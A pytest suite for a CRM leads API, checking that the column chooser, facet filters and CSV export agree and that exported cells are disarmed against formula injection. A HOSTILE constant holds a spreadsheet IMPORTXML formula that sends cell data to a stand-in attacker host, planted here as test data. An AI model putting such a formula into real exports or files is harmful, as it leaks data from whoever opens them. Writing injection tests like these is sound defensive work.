"""The Leads table's lens: which columns, which rows — and that the FILE agrees.

Three properties are load-bearing here and each has cost somebody something before:

1. **The export writes the columns the screen shows.** SURFACES §2 asks for a "column
   chooser mirrored in CSV export". The mirroring is the requirement, not the chooser:
   this is the one route that emits UNMASKED phone numbers, and a screen and a file that
   disagree about the same query string is how a client exports more than they meant to.
   `test_the_export_header_is_the_screens_column_list` compares the two over the wire for
   the same query string, so a future surface that grows its own column list fails here.

2. **The formula guard covers every column the chooser can offer.** The prior incident
   (redteam_extraction_poisoning_test, and the `name`-column hole it found) was caused by
   disarming the *interesting* columns rather than the row. A column chooser is exactly
   the change that could reintroduce it — a new selectable column that renders through a
   different path would be unguarded — so `test_every_selectable_column_is_disarmed`
   walks the registry and exports each column ALONE with a hostile value in it.

3. **A stale reference degrades, and a stale FILTER does not degrade silently.** A
   dropped column narrows the file identically to the screen; a dropped filter would
   WIDEN the set, which on this route means unmasked numbers. The two are asserted apart.
"""

from __future__ import annotations

import csv
import io
import json
import uuid
from typing import Any

import pytest
from apps.api.crm import columns as registry
from apps.api.db.base import uuid7
from apps.api.db.session import tenant_session, untenanted_session
from apps.api.main import app
from calevate_shared.extraction import ExtractionField
from httpx import ASGITransport, AsyncClient
from sqlalchemy import text

#: A value that executes on open in Excel. The same shape `redteam_extraction_poisoning`
#: uses, planted in EVERY column this suite can reach.
HOSTILE = '=IMPORTXML("https://evil.example/"&A1,"//x")'

#: An enum field, because facets are enum-driven, plus a text field so the registry has
#: something selectable that is NOT facetable.
SCHEMA = [
    {
        "key": "budget_band",
        "label": "Budget band",
        "type": "enum",
        "enum_values": ["under_20l", "20l_50l", "over_50l"],
        "description": "what they can spend",
    },
    {"key": "locality", "label": "Locality", "type": "text", "description": "where"},
]


class Tenant:
    def __init__(self, tenant_id: uuid.UUID, agent_id: uuid.UUID, slug: str, token: str) -> None:
        self.tenant_id = tenant_id
        self.agent_id = agent_id
        self.slug = slug
        self.token = token

    @property
    def headers(self) -> dict[str, str]:
        return {"Authorization": f"Bearer {self.token}", "X-Org-Slug": self.slug}


async def _tenant(role: str = "owner", schema: list[dict[str, Any]] | None = None) -> Tenant:
    """One org, one agent, one owner, one extraction schema — no seeded fixtures.

    Built by hand rather than through `admin_service.create_organization` because the
    point of every test here is the SHAPE of the capture list, and a vertical template
    would decide that for us.
    """
    tenant_id, user_id, agent_id = uuid.uuid4(), uuid.uuid4(), uuid.uuid4()
    slug = f"col-{tenant_id.hex[:10]}"
    clerk_id = f"user_{uuid.uuid4().hex[:12]}"
    async with untenanted_session() as session:
        await session.execute(
            text(
                "INSERT INTO users (id, clerk_user_id, email, created_at, updated_at) "
                "VALUES (:id, :cid, :email, now(), now())"
            ),
            {"id": user_id, "cid": clerk_id, "email": f"{clerk_id}@example.com"},
        )
    async with tenant_session(tenant_id) as session:
        await session.execute(
            text(
                "INSERT INTO organizations (id, name, slug, status, created_at, updated_at) "
                "VALUES (:id, 'Column Realty', :slug, 'active', now(), now())"
            ),
            {"id": tenant_id, "slug": slug},
        )
        await session.execute(
            text(
                "INSERT INTO memberships (id, tenant_id, user_id, role, created_at, updated_at) "
                "VALUES (:id, :tid, :uid, :role, now(), now())"
            ),
            {"id": uuid.uuid4(), "tid": tenant_id, "uid": user_id, "role": role},
        )
        await session.execute(
            text(
                "INSERT INTO agents (id, tenant_id, name, direction, disclosure_line, status, "
                "engine, created_at, updated_at) VALUES (:id, :tid, 'Sales', 'inbound', "
                "'Idi AI assistant.', 'live', 'fake', now(), now())"
            ),
            {"id": agent_id, "tid": tenant_id},
        )
        await session.execute(
            text(
                "INSERT INTO extraction_schemas (id, tenant_id, agent_id, version, fields, "
                "created_at, updated_at) VALUES (:id, :tid, :aid, 1, CAST(:f AS jsonb), now(), "
                "now())"
            ),
            {
                "id": uuid.uuid4(),
                "tid": tenant_id,
                "aid": agent_id,
                "f": json.dumps(SCHEMA if schema is None else schema),
            },
        )
    return Tenant(tenant_id, agent_id, slug, f"dev:client:{clerk_id}")


async def _lead(
    t: Tenant, *, name: str = "Ramesh", data: dict[str, Any] | None = None, phone: str | None = None
) -> uuid.UUID:
    lead_id = uuid7()
    async with tenant_session(t.tenant_id) as session:
        await session.execute(
            text(
                "INSERT INTO leads (id, tenant_id, agent_id, phone_e164, name, source, status, "
                "data, created_at, updated_at) VALUES (:i, :t, :a, :p, :n, 'inbound_call', 'new', "
                "CAST(:d AS jsonb), now(), now())"
            ),
            {
                "i": lead_id,
                "t": t.tenant_id,
                "a": t.agent_id,
                "p": phone or f"+9198{uuid.uuid4().int % 100000000:08d}",
                "n": name,
                "d": json.dumps(data or {}),
            },
        )
    return lead_id


def _client() -> AsyncClient:
    return AsyncClient(transport=ASGITransport(app=app), base_url="http://api")


def _rows(body: str) -> list[list[str]]:
    return [row for row in csv.reader(io.StringIO(body)) if row]


# ------------------------------------------------------------------ the registry


def test_the_registry_never_lets_a_schema_field_shadow_a_fixed_column() -> None:
    """`ExtractionField.key` permits `status`, and one key meaning two columns would make
    the export's own header ambiguous about which of them it wrote."""
    fields = [
        ExtractionField(key="status", label="Deal stage", type="text"),
        ExtractionField(key="locality", label="Locality", type="text"),
    ]
    columns = registry.available(fields)
    keys = [c.key for c in columns]
    assert keys.count("status") == 1
    assert next(c for c in columns if c.key == "status").kind == "fixed"
    assert "locality" in keys


def test_facets_are_extraction_enums_and_nothing_else() -> None:
    """The requirement is "driven by the extraction schema", so `status` and `source` —
    both enums, both fixed — stay out. `crm.columns.facetable` argues each exclusion."""
    columns = registry.available([ExtractionField.model_validate(f) for f in SCHEMA])
    assert [c.key for c in registry.facetable(columns)] == ["budget_band"]


def test_an_all_unknown_selection_falls_back_rather_than_yielding_no_columns() -> None:
    columns = registry.available([])
    resolved = registry.resolve(columns, ["nope", "also_nope"])
    assert resolved.columns == columns, "a file with no columns in it is not a file"
    assert resolved.dropped == ("nope", "also_nope")


def test_the_chooser_keeps_the_order_it_was_given() -> None:
    columns = registry.available([ExtractionField.model_validate(f) for f in SCHEMA])
    resolved = registry.resolve(columns, ["budget_band", "phone", "budget_band"])
    assert [c.key for c in resolved.columns] == ["budget_band", "phone"]


# --------------------------------------------------- the mirroring (the point)


async def test_the_export_header_is_the_screens_column_list() -> None:
    """THE property this slice exists to hold: same query string, same columns.

    Compared over the WIRE on both sides rather than through the resolver, because a
    resolver they both call is the implementation and this is the contract. A future
    surface that grows its own column list passes the unit test and fails this one.
    """
    t = await _tenant()
    await _lead(t, data={"budget_band": "20l_50l", "locality": "Kondapur"})
    query = "?agent_id=" + str(t.agent_id) + "&columns=name,budget_band,phone"

    async with _client() as http:
        listed = await http.get(f"/v1/leads{query}", headers=t.headers)
        exported = await http.get(f"/v1/leads/export.csv{query}", headers=t.headers)

    assert listed.status_code == 200, listed.text
    assert exported.status_code == 200, exported.text
    screen = [c["label"] for c in listed.json()["columns"]]
    assert screen == ["Name", "Budget band", "Phone"]
    assert _rows(exported.text)[0] == screen


async def test_with_no_chooser_the_two_surfaces_still_agree() -> None:
    """The default is one default, not two. Before this slice the screen showed `owner`
    and `updated_at` while the file wrote `source` and `created_at`."""
    t = await _tenant()
    await _lead(t, data={"budget_band": "over_50l"})
    async with _client() as http:
        listed = await http.get(f"/v1/leads?agent_id={t.agent_id}", headers=t.headers)
        exported = await http.get(f"/v1/leads/export.csv?agent_id={t.agent_id}", headers=t.headers)
    assert _rows(exported.text)[0] == [c["label"] for c in listed.json()["columns"]]


async def test_a_facet_filter_narrows_the_file_exactly_as_it_narrows_the_screen() -> None:
    """A filter the screen applies and the export ignores is how a client mails a
    supplier the whole contact list. Same argument `assigned_to` earned before it."""
    t = await _tenant()
    await _lead(t, name="Hot One", data={"budget_band": "over_50l"})
    await _lead(t, name="Cold One", data={"budget_band": "under_20l"})
    query = f"?agent_id={t.agent_id}&f=budget_band:over_50l&columns=name"

    async with _client() as http:
        listed = await http.get(f"/v1/leads{query}", headers=t.headers)
        exported = await http.get(f"/v1/leads/export.csv{query}", headers=t.headers)

    assert [lead["name"] for lead in listed.json()["items"]] == ["Hot One"]
    assert _rows(exported.text)[1:] == [["Hot One"]]


# --------------------------------------------------------- the injection guard


@pytest.mark.parametrize("column", [c.key for c in registry.available([])])
async def test_every_selectable_column_is_disarmed(column: str) -> None:
    """The chooser must not be able to open a hole the row renderer used to close.

    Each FIXED column is exported ALONE, with a hostile value in it wherever a writer can
    put one. Parametrized off the registry itself, so a column added to `crm.columns`
    without a rendering path through `_csv_value` fails here on the day it is added
    rather than in a client's spreadsheet.
    """
    t = await _tenant()
    await _lead(t, name=HOSTILE, phone=HOSTILE)
    # `owner` needs a member name to render; the other fixed columns are enums, counters
    # and timestamps whose writers are constrained — the guard covers them regardless,
    # which is the property under test.
    async with _client() as http:
        response = await http.get(
            f"/v1/leads/export.csv?agent_id={t.agent_id}&columns={column}", headers=t.headers
        )
    assert response.status_code == 200, response.text
    for row in _rows(response.text):
        for cell in row:
            assert not cell.startswith(("=", "+", "-", "@")), (
                f"column {column!r} rendered an executable cell: {cell!r}"
            )


async def test_a_hostile_extraction_value_and_label_survive_the_chooser() -> None:
    """The extraction half of the same claim — value AND header, since a label is
    authored by an admin and read by the client's staff."""
    t = await _tenant(
        schema=[{"key": "note", "label": HOSTILE, "type": "text", "description": "x"}]
    )
    await _lead(t, data={"note": HOSTILE})
    async with _client() as http:
        response = await http.get(
            f"/v1/leads/export.csv?agent_id={t.agent_id}&columns=note", headers=t.headers
        )
    rows = _rows(response.text)
    assert rows[0][0].startswith("\t") and HOSTILE in rows[0][0]
    assert rows[1][0].startswith("\t") and HOSTILE in rows[1][0]


# ------------------------------------------------ staleness: drop vs refuse


async def test_an_unknown_column_narrows_the_table_and_says_so() -> None:
    """A saved view or a bookmark that outlives one schema edit keeps working."""
    t = await _tenant()
    await _lead(t)
    async with _client() as http:
        listed = await http.get(
            f"/v1/leads?agent_id={t.agent_id}&columns=name,vanished", headers=t.headers
        )
        exported = await http.get(
            f"/v1/leads/export.csv?agent_id={t.agent_id}&columns=name,vanished", headers=t.headers
        )
    assert listed.status_code == 200
    body = listed.json()
    assert [c["key"] for c in body["columns"]] == ["name"]
    assert body["dropped_column_keys"] == ["vanished"]
    assert _rows(exported.text)[0] == ["Name"], "the file drops it identically"


async def test_an_unknown_filter_is_refused_rather_than_ignored() -> None:
    """The asymmetry, and the reason for it: an ignored filter WIDENS the set, and this
    route is the one that emits unmasked numbers."""
    t = await _tenant()
    await _lead(t)
    async with _client() as http:
        listed = await http.get(
            f"/v1/leads?agent_id={t.agent_id}&f=vanished:whatever", headers=t.headers
        )
        exported = await http.get(
            f"/v1/leads/export.csv?agent_id={t.agent_id}&f=vanished:whatever", headers=t.headers
        )
    for response in (listed, exported):
        assert response.status_code == 422, response.text
        assert response.json()["type"].endswith("/lead_filter_unknown_field")


async def test_a_malformed_filter_is_refused_with_a_sentence() -> None:
    t = await _tenant()
    async with _client() as http:
        response = await http.get(
            f"/v1/leads?agent_id={t.agent_id}&f=budget_band", headers=t.headers
        )
    assert response.status_code == 422
    assert response.json()["type"].endswith("/lead_filter_malformed")


# ---------------------------------------------------------------------- facets


async def test_facet_counts_follow_every_other_filter_and_ignore_their_own() -> None:
    """The researched semantic: OR within a facet, AND across facets, and a facet's own
    counts computed WITHOUT its own selection — otherwise every unselected value reads 0
    and the panel can only ever be narrowed."""
    t = await _tenant()
    await _lead(t, name="A", data={"budget_band": "over_50l"})
    await _lead(t, name="B", data={"budget_band": "over_50l"})
    await _lead(t, name="C", data={"budget_band": "under_20l"})

    async with _client() as http:
        response = await http.get(
            f"/v1/leads/facets?agent_id={t.agent_id}&f=budget_band:over_50l", headers=t.headers
        )
    assert response.status_code == 200, response.text
    facet = response.json()["facets"][0]
    assert facet["key"] == "budget_band"
    counts = {v["value"]: v["count"] for v in facet["values"]}
    assert counts == {"over_50l": 2, "under_20l": 1, "20l_50l": 0}
    assert all(v["declared"] for v in facet["values"]), "all three are in the schema"


async def test_a_value_the_schema_no_longer_declares_is_still_offered_and_flagged() -> None:
    """A schema edited after rows were captured leaves values behind. A value that
    demonstrably exists and cannot be filtered on is a table that lies about itself."""
    t = await _tenant()
    await _lead(t, data={"budget_band": "legacy_band"})
    async with _client() as http:
        response = await http.get(f"/v1/leads/facets?agent_id={t.agent_id}", headers=t.headers)
    values = {v["value"]: v for v in response.json()["facets"][0]["values"]}
    assert values["legacy_band"]["declared"] is False
    assert values["legacy_band"]["count"] == 1
    assert values["over_50l"]["declared"] is True


async def test_a_non_string_value_is_not_offered_as_a_facet() -> None:
    """`data` is JSONB written by a model; a field whose type changed leaves objects
    behind, and `->>` would render one as its JSON source — a value nobody stored."""
    t = await _tenant()
    await _lead(t, data={"budget_band": {"amount": 5}})
    async with _client() as http:
        response = await http.get(f"/v1/leads/facets?agent_id={t.agent_id}", headers=t.headers)
    values = {v["value"]: v["count"] for v in response.json()["facets"][0]["values"]}
    assert all(count == 0 for count in values.values())
    assert not any(v.startswith("{") for v in values)
